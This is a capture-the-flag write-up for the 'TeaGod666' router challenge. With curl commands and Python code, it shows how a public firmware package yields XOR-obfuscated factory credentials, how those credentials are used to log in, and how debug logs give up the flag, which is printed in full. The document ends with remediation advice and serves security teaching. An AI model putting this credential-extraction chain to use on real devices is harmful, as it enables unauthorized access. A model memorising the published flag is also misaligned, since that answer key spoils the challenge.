# TeaGod666

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Miscellaneous |
| Points | 100 |
| Author | PGpenguin72 |
| Connection | `http://chal.thjcc.org:7356/` |
| Package | [`artifacts/teagod666-update.bin`](artifacts/teagod666-update.bin) |
| Package SHA-256 | `edc578e1dfc77ee8b3861dce01a4076427922eea3bbde7acc2b9167a93029f6a` |
| Solver | [`solve.py`](solve.py) |
| Transcript | [`artifacts/protocol-transcript.txt`](artifacts/protocol-transcript.txt) |
| Flag | `THJCC{t3ag0d666_h77p5://y0u7u.b3/Dji_wUhFPvo?si=z1B9a-4nShzop-du&t=1577}` |

> TeaGod666 router administration interface. The long AI-generated product
> description explicitly says it is unrelated to the challenge.

## TL;DR

The unauthenticated login page checks `/api/update/check`, which discloses a
public firmware-package endpoint. The 237-byte `TEAGOD66` package contains both
a plaintext repeating-XOR key (`teashop-666`) and a Base64-encoded ciphertext.
Decoding and XORing that payload recovers the factory credentials
`admin / oolong_tea_666`. After logging in, requesting the otherwise hidden
`debug` log level exposes a `factory_validation` event containing the flag.

## 1. Ignore the Decoy Story and Read the Client

The page presents a router login form. The visible product description claims
that the default credentials are `admin / admin`, but it also admits that the
description was AI-generated and unrelated. As expected, those credentials are
rejected:

```text
POST /api/login
{"username":"admin","password":"admin"}

HTTP/1.0 401 Unauthorized
{"ok":false,"error":"invalid credentials"}
```

The page's JavaScript is more useful than the story. Before authentication, it
immediately invokes `checkVersion()`:

```javascript
async function checkVersion() {
  const result = await api('/api/update/check');
  versionStatus.textContent = result.update_available
    ? `發現新版本：${result.latest_version}`
    : `系統版本 ${result.current_version}，目前為最新版本`;
}
```

The system page also reveals that the response includes a package link:

```javascript
const result = await api('/api/update/check');
link.href = result.package_url;
```

Because `checkVersion()` runs on the unauthenticated login page, the endpoint
must be public.

## 2. Discovering the Firmware Package

Query the update service directly:

```bash
curl -sS http://chal.thjcc.org:7356/api/update/check
```

```json
{
  "current_version": "TG666-1.4.2",
  "latest_version": "TG666-1.4.2",
  "update_available": false,
  "package_url": "/api/update/package?channel=stable"
}
```

The package remains downloadable even though no update is available and the
caller is not logged in:

```bash
curl -sS \
  'http://chal.thjcc.org:7356/api/update/package?channel=stable' \
  -o teagod666-update.bin
```

```text
$ file teagod666-update.bin
teagod666-update.bin: data

$ wc -c teagod666-update.bin
237 teagod666-update.bin

$ shasum -a 256 teagod666-update.bin
edc578e1dfc77ee8b3861dce01a4076427922eea3bbde7acc2b9167a93029f6a
```

The original package is preserved at
[`artifacts/teagod666-update.bin`](artifacts/teagod666-update.bin).

## 3. Reconstructing the Container Format

The first eight bytes provide an obvious magic value:

```text
00000000: 54 45 41 47 4f 44 36 36 01 00 0b 00 36 00 41 00  TEAGOD66....6.A.
00000010: 00 00 00 00 ac 00 00 00 64 17 f2 b4 30 a5 bb d5  ........d...0...
...
00000030: 07 6f c1 51 5b 4d 74 65 61 73 68 6f 70 2d 36 36  .o.Q[Mteashop-66
00000040: 36 44 30 63 4d 48 41 77 4b 48 41 38 4d 46 47 49  6D0cMHAwKHA8MFGI
```

Interpreting the compact header as little-endian integers gives a consistent
layout:

| Offset | Size | Value | Meaning |
| ---: | ---: | --- | --- |
| `0x00` | 8 | `TEAGOD66` | Package magic |
| `0x08` | 2 | `1` | Format version |
| `0x0a` | 2 | `11` | Key length |
| `0x0c` | 2 | `54` (`0x36`) | Key offset |
| `0x0e` | 2 | `65` (`0x41`) | Payload offset |
| `0x10` | 2 | `0` | Reserved field |
| `0x12` | 4 | `172` | Encoded payload length |
| `0x16` | 32 | opaque | Package metadata / verification data |
| `0x36` | 11 | `teashop-666` | Cipher key |
| `0x41` | 172 | Base64 text | Encoded ciphertext |

The offsets and lengths line up exactly with the 237-byte file:

```python
version, key_len, key_off, data_off = struct.unpack_from("<HHHH", blob, 8)
reserved = struct.unpack_from("<H", blob, 16)[0]
data_len = struct.unpack_from("<I", blob, 18)[0]

key = blob[key_off:key_off + key_len]
encoded = blob[data_off:data_off + data_len]
```

## 4. Decoding the Configuration

The payload region is valid Base64. Decoding it produces 127 bytes of
non-random, low-valued data. Since the package embeds the 11-byte string
`teashop-666` immediately before the payload, a repeating XOR is the natural
next test:

```python
ciphertext = base64.b64decode(encoded)
plaintext = bytes(
    byte ^ key[index % len(key)]
    for index, byte in enumerate(ciphertext)
)
print(plaintext.decode())
```

The result is structured JSON:

```json
{
  "model": "TeaGod666",
  "username": "admin",
  "password": "oolong_tea_666",
  "note": "Factory service account. Rotate after first boot."
}
```

The firmware package therefore distributes a live factory credential together
with the key needed to decrypt it.

## 5. Logging In

Use the recovered account and retain the session cookie:

```bash
curl -sS -c cookies.txt \
  -X POST http://chal.thjcc.org:7356/api/login \
  -H 'Content-Type: application/json' \
  --data '{"username":"admin","password":"oolong_tea_666"}'
```

```json
{"ok": true}
```

The cookie now permits access to `/api/router`, `/api/system/logs`, Wi-Fi
configuration, and the simulated reboot endpoint.

## 6. Finding the Hidden Log Level

The frontend loads system events with a fixed level:

```javascript
const logs = await api('/api/system/logs?level=info');
```

The presence of an explicit `level` parameter suggests trying the other common
diagnostic level, `debug`:

```bash
curl -sS -b cookies.txt \
  'http://chal.thjcc.org:7356/api/system/logs?level=debug'
```

The debug response includes all normal events plus one extra entry:

```json
{
  "level": "DEBUG",
  "event": "factory_validation",
  "message": "maintenance note: THJCC{t3ag0d666_h77p5://y0u7u.b3/Dji_wUhFPvo?si=z1B9a-4nShzop-du&t=1577}"
}
```

The exact flag was submitted to the competition platform and accepted.

## 7. Automated Solver

[`solve.py`](solve.py) performs the complete chain with Python's standard
library:

1. Call the public update checker.
2. Download and parse the package.
3. Base64-decode and repeating-XOR the configuration.
4. Log in with the recovered factory account.
5. Request the debug logs and extract the flag.

Run it with:

```bash
python3 solve.py
```

Expected output:

```text
[+] package key: teashop-666
[+] factory username: admin
[+] flag: THJCC{t3ag0d666_h77p5://y0u7u.b3/Dji_wUhFPvo?si=z1B9a-4nShzop-du&t=1577}
```

## Why It Works

Several individually weak design decisions combine into complete compromise:

- Firmware packages are downloadable without authentication.
- The encryption key is stored next to the ciphertext it protects.
- Repeating-key XOR provides obfuscation, not meaningful confidentiality.
- A factory service account remains enabled with a recoverable password.
- Sensitive maintenance data is retained in an administrator-accessible debug
  log.

The login form itself is not bypassed. Instead, the application publicly
distributes everything needed to obtain a valid privileged session.

## Remediation

- Remove credentials and secrets from firmware packages entirely.
- Disable factory accounts during provisioning and require unique credentials
  per device.
- Sign firmware packages and keep signing keys outside distributed artifacts.
- Do not treat an embedded symmetric key as protection for adjacent data.
- Authenticate update metadata and package downloads when they contain
  non-public material.
- Never log flags, credentials, tokens, or maintenance secrets, even at debug
  level; scrub existing log archives after rotation.

## Flag

```text
THJCC{t3ag0d666_h77p5://y0u7u.b3/Dji_wUhFPvo?si=z1B9a-4nShzop-du&t=1577}
```
